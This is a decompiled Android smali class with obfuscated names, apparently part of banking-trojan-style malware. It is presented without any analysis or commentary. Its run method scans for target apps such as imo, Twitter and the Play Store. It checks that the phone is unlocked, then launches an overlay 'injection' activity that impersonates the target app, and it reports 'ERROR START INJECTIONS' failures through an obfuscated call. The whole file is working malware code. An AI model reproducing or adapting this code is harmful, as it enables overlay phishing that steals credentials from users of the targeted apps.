.class Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Ljava/lang/String;

.field final synthetic d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;


# direct methods
.method constructor <init>(Lwocwvy/czyxoxmbauu/slsa/egxltnv;Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iput-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->a:Ljava/lang/String;

    iput-object p3, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->b:Landroid/content/Context;

    iput-object p4, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->c:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Start"

    const-string v2, "StartScanInjector egxltnv"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->a:Ljava/lang/String;

    const-string v1, "com.imo.android.imoim,com.twitter.android"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "com.imo.android.imoim,com.twitter.android"

    const-string v2, "com.imo.android.imoim,com.twitter.android,com.android.vending"

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    :cond_0
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ACCESIB"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, ""

    if-eq v0, v1, :cond_5

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->b:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->o(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_5

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->c:Ljava/lang/String;

    const/4 v2, 0x0

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v3, v3, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "App"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v3, 0x0

    move-object v4, v2

    const/4 v2, 0x0

    :goto_0
    const-string v5, "/"

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    array-length v5, v5

    if-ge v2, v5, :cond_4

    const-string v5, "/"

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    aget-object v5, v5, v2

    const-string v6, ","

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x1

    :goto_1
    array-length v7, v5

    if-ge v6, v7, :cond_2

    aget-object v7, v5, v6

    invoke-virtual {v1, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_1

    aget-object v4, v5, v3

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v5, v5, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "nameInject"

    invoke-virtual {v5, v6, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :cond_1
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    :cond_2
    :goto_2
    if-eqz v4, :cond_3

    goto :goto_3

    :cond_3
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_4
    :goto_3
    if-eqz v4, :cond_5

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->b:Landroid/content/Context;

    const-string v1, "keyguard"

    invoke-virtual {v0, v1}, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0

    if-nez v0, :cond_5

    :try_start_0
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->b:Landroid/content/Context;

    const-class v2, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "str"

    invoke-virtual {v0, v1, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    invoke-virtual {v1, v0}, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->b:Landroid/content/Context;

    const-string v2, "4"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "p="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v4, v4, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->d:Lwocwvy/czyxoxmbauu/slsa/egxltnv;

    iget-object v6, v6, Lwocwvy/czyxoxmbauu/slsa/egxltnv;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, p0, Lwocwvy/czyxoxmbauu/slsa/egxltnv$1;->b:Landroid/content/Context;

    invoke-virtual {v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "|ERROR START INJECTIONS|"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_5
    return-void
.end method
